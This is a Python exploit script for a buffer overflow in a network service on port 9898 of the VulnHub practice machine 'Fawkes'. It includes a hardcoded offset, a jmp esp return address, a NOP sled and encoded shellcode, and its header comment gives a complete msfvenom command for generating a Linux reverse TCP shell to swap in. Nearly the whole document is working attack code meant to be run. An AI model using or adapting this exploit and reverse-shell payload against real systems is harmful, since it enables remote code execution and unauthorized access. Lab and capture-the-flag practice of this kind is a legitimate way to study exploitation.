#!/usr/bin/env python3

# This is a script to perform a buffer overflow on port 9898 binary, on the vulnhub machine fawkes, to make it work, just change the ip_addr, the EIP is already pointing
# to an address with the "jmp esp(FF E4)" OPcode, dont forget to change the shellcode to one that fit your needs, ill leave an example of msfvenom syntax below.
#
# syntax => msfvenom -p linux/x86/shell_reverse_tcp --platform linux -a x86 --encoder x86/shikata_ga_nai -f c -b "\x00\x0b\x0d" EXITFUNC=thread LPORT=<port> LHOST=<ip>
#
# and then just paste the output in the shell code variable with the same structure as the one below(ex. b"x\d1\x32\x01...")
# [REMEMBER adding the encode "b" mark before each string] ;) 
# <***>KAYL<***>

import struct, signal, sys, socket, time

def def_handler(sig, frame):
    print(f"\nClosing the program...")
    try:
        s.close()
    except:
        sys.exit(1)
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

def socket_conn(connection, payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(connection)
    gretting = s.recv(2048).decode()
    print(f"\n[+]SERVER grettings:\n{gretting}\n\n")
    time.sleep(2)
    print(f"\n[***]Preparing the payload...[***]\n\n")
    time.sleep(3)
    s.send(payload)
    response = s.recv(2048)


def main():
    ip_addr = "127.0.0.1"    #CHANGE
    port = 9898
    connection = (ip_addr, port)
    offset = 112
    before_eip = b"A" * offset
    eip = struct.pack("<L", 0x8049d55)
    padding = b"\x90"*28
    shellcode = (b"\xd9\xd0\xb8\xbe\x2e\x52\x4d\xd9\x74\x24\xf4\x5f\x33\xc9"
b"\xb1\x12\x31\x47\x17\x83\xef\xfc\x03\xf9\x3d\xb0\xb8\x34"
b"\x99\xc3\xa0\x65\x5e\x7f\x4d\x8b\xe9\x9e\x21\xed\x24\xe0"
b"\xd1\xa8\x06\xde\x18\xca\x2e\x58\x5a\xa2\x70\x32\x9d\x1a"
b"\x19\x41\x9e\x52\x77\xcc\x7f\xd2\xe1\x9f\x2e\x41\x5d\x1c"
b"\x58\x84\x6c\xa3\x08\x2e\x01\x8b\xdf\xc6\xb5\xfc\x30\x74"
b"\x2f\x8a\xac\x2a\xfc\x05\xd3\x7a\x09\xdb\x94")       #CHANGE
    after_eip = padding + shellcode
    payload = before_eip + eip + after_eip
    socket_conn(connection, payload)


if __name__ == '__main__':
    main()
